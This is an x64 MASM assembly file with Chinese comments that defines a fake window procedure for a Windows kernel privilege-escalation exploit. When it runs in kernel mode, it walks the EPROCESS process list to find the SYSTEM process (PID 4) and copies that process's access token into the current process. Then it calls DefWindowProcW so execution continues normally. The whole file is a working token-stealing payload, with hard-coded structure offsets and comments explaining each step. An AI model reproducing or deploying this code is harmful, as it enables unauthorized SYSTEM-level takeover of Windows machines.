public WndProc_fake
extern DefWindowProcW:proc 
.code

WndProc_fake proc hwnd:dword, msg:dword, wParam:dword, lParam:dword
    mov ax,cs
    cmp ax,10h
    jnz return
    pushfq
	push rax
	push rdx
	push rbx
	mov rax, gs:[188h]    ; gs：[0]是KPRCR  +180是KPRCB（+0x180 Prcb  : _KPRCB）    +8是KTHREAD指针（+0x008 CurrentThread    : Ptr64 _KTHREAD）
	                      ;gs：[188]获得了当前线程的KTHREAD 结构指针
						  ;KTHREAD指针加上+50是KAPC_STATE加上+20的EPROCESS指针：
	mov rax, [rax + 210h] ;0x0220也能获得EPROCESS	0x0220 KPROCESS *Process 6.2 and higher	previously at 0x0150 and 0x0210
	lea rdx, [rax + 208h] ;MyProcess.Token rdx存储当前进程token
noFind :
	mov rax, [rax + 188h] ;Eprocess.ActiveProcessLinks 获取下一进程EPROCESS地址 ActiveProcessLinks list head
	sub rax, 188h         ;next Eprocess struct
	mov rbx, [rax + 180h] ;PID 0x180h UniqueProcessId
	cmp rbx, 4            ; 判断pid是否为4，不为4则跳转
	jnz noFind
	mov rax, [rax + 208h] ;System.Token
	mov [rdx], rax        ;替换当前进程token
	pop rbx
	pop rdx
	pop rax
	popfq
return:
    mov ecx,hwnd
    mov edx,msg
    mov r8d,wParam
    mov r9d,lParam
    sub rsp,20h
    call DefWindowProcW	 ;调用窗口过程函数，此函数已经被替换为上面的提权函数
    add rsp,20h
    ret

WndProc_fake endp

end